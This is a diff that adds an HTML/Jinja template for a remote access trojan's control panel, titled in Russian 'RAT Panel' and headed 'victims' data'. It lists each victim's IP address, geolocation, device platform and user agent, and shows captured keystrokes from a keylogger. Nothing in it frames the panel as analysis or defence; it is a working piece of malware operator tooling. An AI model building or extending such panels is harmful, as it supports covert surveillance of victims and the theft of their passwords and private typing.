@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head><title>RAT Панель</title></head>
+<body>
+<h2>Данные жертв:</h2>
+{% for log in logs %}
+  <p>
+    <b>{{ log.time }}</b><br>
+    {% if log.type == 'info' %}
+      IP: {{ log.ip }}<br>
+      GEO: {{ log.loc }}<br>
+      Устройство: {{ log.platform }}<br>
+      UA: {{ log.ua }}<br>
+    {% elif log.type == 'keys' %}
+      <b>Кейлоги:</b> {{ log.keys }}
+    {% endif %}
+    <hr>
+  </p>
+{% endfor %}
+</body>
+</html>
